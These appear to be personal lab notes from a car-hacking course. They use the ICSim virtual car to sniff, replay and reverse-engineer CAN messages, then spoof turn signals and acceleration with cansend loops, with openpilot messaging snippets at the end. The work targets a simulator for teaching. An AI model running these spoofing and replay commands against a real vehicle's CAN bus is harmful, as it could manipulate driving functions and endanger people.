CAN   JLL, 2021.4.26-5.2
Copy and Paste Code Snippets to zc.py
--------------------------------------------------
CCCCCCCCCCCCCCCCCCCCCCCC Code Snippets
'''
CAN 13    2021.4.29-5.2
Hacking a "virtual" car
[1] Hacking the CAN Bus: Basic Manipulation of a Modern Automobile Through CAN Bus
    Reverse Engineering, 2017
[2] Car Hacking 101: Practical Guide to Exploiting CAN-Bus using Instrument
    Cluster Simulator — Part I: Setting Up — Part II: Exploitation, 2019
[3] Car Hacker's Handbook by OpenGarages
[4] Car Hacking: Accessing and Exploiting the CAN Bus Protocol, 2019

Do CAN 3 first. Do NOT copy these to zc.py.
'''

---------- Step 0: Safety and Preliminary
--- Power => Driving wheels, Engine, Brakes, Transmission
--- Emergency shutoff procedures [1]
--- Use CAN tools to record, replay, and reverse engineer CAN messages
--- Fig. 3 [1]: bits = 13+6+8+16+2+7+3 = 27+28 = 56
--- sniff, spoof, craft (attack)
--- CAN => OBD-II (Board), Fig. 7 => cable 1 => CANtact (Fig. 8) or comma 2
    => cable 2 => PC+Ubuntu => SocketCAN (Fig. 9)
--- The word “Socket” is the combination of port and IP address.
    The word “Port” is the number used by particular software.
    Transport protocol icludes IP address, port number, and socket.
    Socket mysocket = getSocket(type = "TCP")
    connect(mysocket, address = "1.2.3.4", port = "80")
    send(mysocket, "Hello, world!")
    close(mysocket)
--- SocketCAN can-utils: See CAN 3
    1. candump can0  # dump CAN packets to console via interface can0
    2. cansend can0 123#1122334455667788  # send a packet to CAN bus
    3. cansniffer can0 # dump and filter CAN messages

--- Do [2] Car Hacking 101 on a "virtual" car as follows.

---------- Step 1: Setting up the virtual Environment
--- Install SDL (Simple DirectMedia Layer) libraries
jinn@Liu:~$ sudo apt-get install libsdl2-dev libsdl2-image-dev -y
--- Install ICSim (Instrument Cluster Simulator)
jinn@Liu:~$ git clone https://github.com/zombieCraig/ICSim
jinn@Liu:~$ cd ICSim
jinn@Liu:~/ICSim$ ls
jinn@Liu:~/ICSim$ cat setup_vcan.sh
jinn@Liu:~/ICSim$ ./setup_vcan.sh
jinn@Liu:~/ICSim$ ifconfig vcan0
jinn@Liu:~/ICSim$ cat Makefile
jinn@Liu:~/ICSim$ make clean
jinn@Liu:~/ICSim$ make

---------- Step 2: Running the Simulator
--- Terminal 1
jinn@Liu:~/ICSim$ ./icsim vcan0
--- Terminal 2
jinn@Liu:~/ICSim$ ./controls vcan0
--- Close doors: Left-Shift+A etc.
--- See the attack in "IC Simulator" window. Car drives with doors open!
--- Terminal 3
jinn@Liu:~/ICSim$ lsmod | grep can
jinn@Liu:~/ICSim$ cansniffer -c vcan0
00 delta   ID  data ... < cansniffer vcan0 # l=20 h=9.999999  133  00 00 00 00 98          .....
01 delta   ID  data ... < cansniffer vcan0 # l=20 h=9.999999   39  00 2A                   .*
06 delta   ID  data ... < cansniffer vcan0 # l=20 h=0.206087   39  00 39                   .9
27 delta   ID  data ... < cansniffer vcan0 # l=20 h=0.211307   39  00 0C                   ..
0.199835   95  80 00 07 F4 00 00 00 08 ........
0.199991  133  00 00 00 00 A7          .....
--- type ctrl+c
jinn@Liu:~/ICSim$ candump vcan0
--- type ctrl+c
Enabling Logfile 'candump-2021-05-01_133649.log'
jinn@Liu:~/ICSim$ cat candump-2021-05-01_133649.log
--- do these quickly:
jinn@Liu:~/ICSim$ candump -l vcan0
--- click on "CANBus Cpntrol Panel" window and press "Up Arrow"
--- type ctrl+c
jinn@Liu:~/ICSim$ canplayer -I candump-2021-05-01_134848.log
--- see (replay) the speeding up you just pressed in "IC Simulator"
--- move log files to trash since they are big

--- do the video in [2] Part II
--- Terminal 3
jinn@Liu:~/ICSim$ cansniffer -c vcan0
--- type -000000 <Enter>
--- type +40C <Enter>
--- 40C is the throttle ID with random noises. Use "Up Arrow" to
---   speed up (all bytes are changing with red color)
--- this is filtering and showing only the messages of ID 40C
--- type +166 <Enter>
--- only the last byte is changing

---------- Step 3A: Reverse Engineering Turn Signals by Bisection
--- Do [4] Car Hacking: Accessing and Exploiting the CAN Bus
--- Capturing a Baseline CAN Dump with No Turn Signals
--- Terminal 2
jinn@Liu:~/ICSim$ ./controls vcan0
--- do nothing on "CANBus Cpntrol Panel"
--- Terminal 3
jinn@Liu:~/ICSim$ candump -l vcan0
--- type ctrl+c quickly in one second
jinn@Liu:~/ICSim$ mv candump-2021-05-01_222631.log baseline

--- Reverse Engineering the CAN ID of Turn Signals
--- Terminal 3
jinn@Liu:~/ICSim$ candump -l vcan0
--- click on "CANBus Cpntrol Panel", press "Right Arrow" once, and
--- click on Terminal 3 and type ctrl+c very quickly
--- see the right signal showing on "IC Simulator"

jinn@Liu:~/ICSim$ wc -l candump-2021-05-01_222901.log
13564 candump-2021-05-01_222901.log
jinn@Liu:~/ICSim$ canplayer -I candump-2021-05-01_222901.log

--- close "CANBus Cpntrol Panel"
    The needle on the virtual speedometer stops “idling”.
jinn@Liu:~/ICSim$ canplayer -I candump-2021-05-01_222901.log
jinn@Liu:~/ICSim$ split -l 7000 candump-2021-05-01_222901.log x1
jinn@Liu:~/ICSim$ canplayer -I x1aa
jinn@Liu:~/ICSim$ split -l 3500 x1aa x2
jinn@Liu:~/ICSim$ canplayer -I baseline
jinn@Liu:~/ICSim$ canplayer -I x5ac
jinn@Liu:~/ICSim$ canplayer -I baseline
jinn@Liu:~/ICSim$ canplayer -I x5ab
...
jinn@Liu:~/ICSim$ canplayer -I baseline
jinn@Liu:~/ICSim$ for i in {1..2}; do canplayer -I x6aa ; done
--- the for loop is for continuous messages like acceleration not for signals
...
jinn@Liu:~/ICSim$ canplayer -I baseline
jinn@Liu:~/ICSim$ canplayer -I x15ab
jinn@Liu:~/ICSim$ cat x15ab
(1619879344.146325) vcan0 188#02000000
--- we found the ID 188 for signals
--- gedit x15ab, change "2" to 3, and save it to x16
jinn@Liu:~/ICSim$ cat x16
(1619879344.146325) vcan0 188#03000000
jinn@Liu:~/ICSim$ canplayer -I baseline
jinn@Liu:~/ICSim$ canplayer -I x16
--- we spoofed (attacked) the virtual car via vcan0
--- Done! This is a bisection algorithm shown in Fig. 5-6 in
--- http://opengarages.org/handbook/ebook/

---------- Step 4: Attacks
--- Terminal 1
jinn@Liu:~/ICSim$ ./icsim vcan0
--- Terminal 3
jinn@Liu:~/ICSim$ cansend vcan0 188#01000000
jinn@Liu:~/ICSim$ cansend vcan0 188#02000000
jinn@Liu:~/ICSim$ cansend vcan0 188#03000000
--- See the attack on "IC Simulator".

---------- Step 3B: Reverse Engineering Acceleration by Filtering
--- Do http://console-cowboys.blogspot.com/2018/04/
--- Terminal 3
jinn@Liu:~/ICSim$ cansniffer -c vcan0
--- click on "CANBus Cpntrol Panel" window and tap "Right Arrow" several times
--- did you see 40C changing colors (messages)
--- the ID rows fix at the same places in Terminal 3
--- got ID 40C for "Right Arrow"
--- click on "CANBus Cpntrol Panel" window and tap "Up Arrow" several times
--- did you see 244 changing colors (messages)
--- Terminal 3
--- type -000000 <Enter>
--- type +40C <Enter>
--- type +244 <Enter>
--- click on "CANBus Cpntrol Panel" window and tap "Right Arrow" several times
--- click on "CANBus Cpntrol Panel" window and tap "Up Arrow" several times

--- Terminal 2
jinn@Liu:~/ICSim$ ./controls vcan0
--- Press and hold "Up Arrow" to see the max speed is 90 mph.

--- Terminal 3
--- This packet will signal to the car to accelerate to 90 mph!
jinn@Liu:~/ICSim$ cansend vcan0 244#0000003812
jinn@Liu:~/ICSim$ while true; do cansend vcan0 244#0000003812; done

--- #define MAX_SPEED 90.0 in Line 80 of controls.c, change it to 120 mph.
jinn@Liu:~/ICSim$ gedit controls.c
jinn@Liu:~/ICSim$ make
--- Click on "CANBus Cpntrol Panel" and Press and hold "Up Arrow"
--- to see the max speed is now 120 mph (244#0000004B70).
--- from [1]: candump –l slcan0,1DC:7FF

CCCCCCCCCCCCCCCCCCCCCCCC
'''
CAN 12    2021.4.26
openpilot/selfdrive/debug/internal/check_alive_valid.py
(OP) jinn@Liu:~/openpilot/acan$ python zc.py
'''
import time
import cereal.messaging as messaging
if __name__ == "__main__":
  # See /home/jinn/openpilot/cereal/service_list.yaml
  #sm = messaging.SubMaster(['deviceState', 'pandaState', 'modelV2', 'liveCalibration', 'driverMonitoringState', 'longitudinalPlan', 'lateralPlan'])
  sm = messaging.SubMaster(['sensorEvents'])
  i = 0
  while True:
    sm.update(0)
    i += 1
    if i % 100 == 0:
      print("$$$$$ i = ", i)
      print("alive", sm.alive)
      print("valid", sm.valid)
    time.sleep(0.01)

CCCCCCCCCCCCCCCCCCCCCCCC
'''
CAN 11a    2021.4.26
https://github.com/commaai/cereal
--- Terminal 1
(OP) jinn@Liu:~/openpilot/acan$ python zc1.py
'''
import cereal.messaging as messaging
# in publisher
pm = messaging.PubMaster(['sensorEvents'])
dat = messaging.new_message('sensorEvents', size=1)
dat.sensorEvents[0] = {"gyro": {"v": [0.1, -0.1, 0.1]}}
pm.send('sensorEvents', dat)
'''
CAN 11b    2021.4.26
https://github.com/commaai/cereal
--- Terminal 1
(OP) jinn@Liu:~/openpilot/acan$ python zc1.py
--- Terminal 2
(OP) jinn@Liu:~/openpilot/acan$ python zc.py
'''
import cereal.messaging as messaging
# in subscriber
sm = messaging.SubMaster(['sensorEvents'])
while 1:
  sm.update()
  print(sm['sensorEvents'])

--------------------------------------------------
----- Appendix
--- Cantools - CAN message encoding and decoding using DBC, KCD, SYM, ARXML, and CDD formats.
    Provides a command line tool and library module.
--- Collection of CAN bus packages and tools, https://gist.github.com/jackm/f33d6e3a023bfcc680ec3bfa7076e696
--- Semant1ka/can_resouces.md   Useful resources about CAN · GitHub
--- https://github.com/hartkopp/can-isotp
--- Adventures in Automotive Networks and Control Units
